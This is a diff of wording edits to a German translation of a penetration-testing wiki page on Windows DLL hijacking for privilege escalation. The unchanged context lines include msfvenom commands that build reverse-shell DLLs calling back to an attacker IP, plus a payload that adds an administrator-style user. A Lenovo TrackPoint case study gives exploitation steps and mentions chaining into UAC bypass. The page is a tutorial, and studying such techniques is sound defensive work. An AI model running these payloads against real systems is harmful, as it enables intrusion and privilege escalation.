@@ -20,7 +20,7 @@ Es werden mehrere Methoden für DLL Hijacking eingesetzt, wobei jede je nach DLL
 
 ## Fehlende DLLs finden
 
-Der häufigste Weg, um fehlende DLLs in einem System zu finden, besteht darin, [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von Sysinternals auszuführen und **die folgenden 2 Filter** einzustellen:
+Die häufigste Methode, um fehlende DLLs in einem System zu finden, besteht darin, [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von Sysinternals auszuführen und **die folgenden 2 Filter** einzustellen:
 
 ![](<../../../images/image (961).png>)
 
@@ -35,7 +35,7 @@ Wenn Sie nach einer **fehlenden DLL in einer bestimmten ausführbaren Datei** su
 
 ## Ausnutzen fehlender DLLs
 
-Um Privilegien zu eskalieren, haben wir die beste Chance, wenn wir in der Lage sind, **eine DLL zu schreiben, die ein privilegierter Prozess versuchen wird zu laden** an einem **Ort, wo sie gesucht wird**. Daher werden wir in der Lage sein, **eine DLL in einem** **Ordner** zu **schreiben**, wo die **DLL vor** dem Ordner, in dem die **ursprüngliche DLL** ist (seltsamer Fall), gesucht wird, oder wir werden in der Lage sein, **in einem Ordner zu schreiben, wo die DLL gesucht wird** und die ursprüngliche **DLL nicht in einem Ordner existiert**.
+Um Privilegien zu eskalieren, haben wir die beste Chance, wenn wir in der Lage sind, **eine DLL zu schreiben, die ein privilegierter Prozess versuchen wird zu laden** an einem **Ort, wo sie gesucht wird**. Daher werden wir in der Lage sein, **eine DLL in einem** **Ordner** zu **schreiben**, wo die **DLL vor** dem Ordner, in dem die **ursprüngliche DLL** ist (seltsamer Fall), oder wir werden in der Lage sein, **in einen Ordner zu schreiben, wo die DLL gesucht wird** und die ursprüngliche **DLL nicht in einem Ordner existiert**.
 
 ### DLL-Suchreihenfolge
 
@@ -64,7 +64,7 @@ Es gibt andere Möglichkeiten, die Suchreihenfolge zu ändern, aber ich werde si
 
 Bestimmte Ausnahmen von der standardmäßigen DLL-Suchreihenfolge sind in der Windows-Dokumentation vermerkt:
 
-- Wenn eine **DLL, die denselben Namen wie eine bereits im Speicher geladene DLL hat**, gefunden wird, umgeht das System die übliche Suche. Stattdessen wird eine Überprüfung auf Umleitung und ein Manifest durchgeführt, bevor auf die bereits im Speicher befindliche DLL zurückgegriffen wird. **In diesem Szenario führt das System keine Suche nach der DLL durch**.
+- Wenn eine **DLL, die denselben Namen wie eine bereits im Speicher geladene hat**, gefunden wird, umgeht das System die übliche Suche. Stattdessen wird eine Überprüfung auf Umleitung und ein Manifest durchgeführt, bevor auf die bereits im Speicher befindliche DLL zurückgegriffen wird. **In diesem Szenario führt das System keine Suche nach der DLL durch**.
 - In Fällen, in denen die DLL als **bekannte DLL** für die aktuelle Windows-Version erkannt wird, verwendet das System seine Version der bekannten DLL sowie alle abhängigen DLLs, **ohne den Suchprozess durchzuführen**. Der Registrierungsschlüssel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser bekannten DLLs.
 - Sollte eine **DLL Abhängigkeiten haben**, wird die Suche nach diesen abhängigen DLLs so durchgeführt, als ob sie nur durch ihre **Modulnamen** angegeben wären, unabhängig davon, ob die ursprüngliche DLL über einen vollständigen Pfad identifiziert wurde.
 
@@ -72,10 +72,10 @@ Bestimmte Ausnahmen von der standardmäßigen DLL-Suchreihenfolge sind in der Wi
 
 **Anforderungen**:
 
-- Identifizieren Sie einen Prozess, der unter **unterschiedlichen Rechten** (horizontale oder laterale Bewegung) arbeitet oder arbeiten wird, der **eine DLL** **fehlt**.
+- Identifizieren Sie einen Prozess, der unter **unterschiedlichen Rechten** (horizontale oder laterale Bewegung) arbeitet oder arbeiten wird, und der **eine DLL** **fehlt**.
 - Stellen Sie sicher, dass **Schreibzugriff** für ein **Verzeichnis** verfügbar ist, in dem die **DLL** **gesucht wird**. Dieser Ort könnte das Verzeichnis der ausführbaren Datei oder ein Verzeichnis innerhalb des Systempfads sein.
 
-Ja, die Anforderungen sind kompliziert zu finden, da **es standardmäßig seltsam ist, eine privilegierte ausführbare Datei ohne eine DLL zu finden** und es ist sogar **noch seltsamer, Schreibberechtigungen in einem Systempfad-Ordner zu haben** (standardmäßig können Sie das nicht). Aber in falsch konfigurierten Umgebungen ist dies möglich.\
+Ja, die Anforderungen sind kompliziert zu finden, da **es standardmäßig seltsam ist, eine privilegierte ausführbare Datei ohne eine DLL zu finden** und es ist sogar **noch seltsamer, Schreibberechtigungen für einen Systempfad-Ordner zu haben** (standardmäßig können Sie das nicht). Aber in falsch konfigurierten Umgebungen ist dies möglich.\
 Falls Sie Glück haben und die Anforderungen erfüllen, könnten Sie das [UACME](https://github.com/hfiref0x/UACME) Projekt überprüfen. Auch wenn das **Hauptziel des Projekts darin besteht, UAC zu umgehen**, finden Sie dort möglicherweise einen **PoC** für ein DLL-Hijacking für die Windows-Version, die Sie verwenden können (wahrscheinlich müssen Sie nur den Pfad des Ordners ändern, in dem Sie Schreibberechtigungen haben).
 
 Beachten Sie, dass Sie **Ihre Berechtigungen in einem Ordner überprüfen können**, indem Sie:
@@ -126,7 +126,7 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**Einen Benutzer erstellen (x86, ich habe keine x64-Version gesehen):**
+**Erstellen Sie einen Benutzer (x86, ich habe keine x64-Version gesehen):**
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
@@ -222,11 +222,11 @@ Dieser Fall demonstriert **Phantom DLL Hijacking** im TrackPoint Quick Menu von 
 - **Komponente**: `TPQMAssistant.exe` befindet sich unter `C:\ProgramData\Lenovo\TPQM\Assistant\`.
 - **Geplanter Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` wird täglich um 9:30 Uhr im Kontext des angemeldeten Benutzers ausgeführt.
 - **Verzeichnisberechtigungen**: Schreibbar durch `CREATOR OWNER`, was lokalen Benutzern erlaubt, beliebige Dateien abzulegen.
-- **DLL-Suchverhalten**: Versucht, `hostfxr.dll` zuerst aus seinem Arbeitsverzeichnis zu laden und protokolliert "NAME NOT FOUND", wenn sie fehlt, was auf eine Priorität der lokalen Verzeichnissuche hinweist.
+- **DLL-Suchverhalten**: Versucht zuerst, `hostfxr.dll` aus dem Arbeitsverzeichnis zu laden, und protokolliert "NAME NOT FOUND", wenn sie fehlt, was auf eine Priorität der lokalen Verzeichnissuche hinweist.
 
 ### Exploit-Implementierung
 
-Ein Angreifer kann einen bösartigen `hostfxr.dll` Stub im selben Verzeichnis platzieren, um die fehlende DLL auszunutzen und die Codeausführung im Kontext des Benutzers zu erreichen:
+Ein Angreifer kann einen bösartigen `hostfxr.dll` Stub im selben Verzeichnis platzieren und die fehlende DLL ausnutzen, um Code im Kontext des Benutzers auszuführen:
 ```c
 #include <windows.h>
 
@@ -242,7 +242,7 @@ return TRUE;
 
 1. Als Standardbenutzer `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\` ablegen.
 2. Warten, bis die geplante Aufgabe um 9:30 Uhr im Kontext des aktuellen Benutzers ausgeführt wird.
-3. Wenn ein Administrator angemeldet ist, während die Aufgabe ausgeführt wird, läuft die bösartige DLL in der Sitzung des Administrators mit mittlerer Integrität.
+3. Wenn ein Administrator angemeldet ist, wenn die Aufgabe ausgeführt wird, läuft die bösartige DLL in der Sitzung des Administrators mit mittlerer Integrität.
 4. Ketten Sie Standard-UAC-Bypass-Techniken, um von mittlerer Integrität auf SYSTEM-Rechte zu erhöhen.
 
 ### Minderung
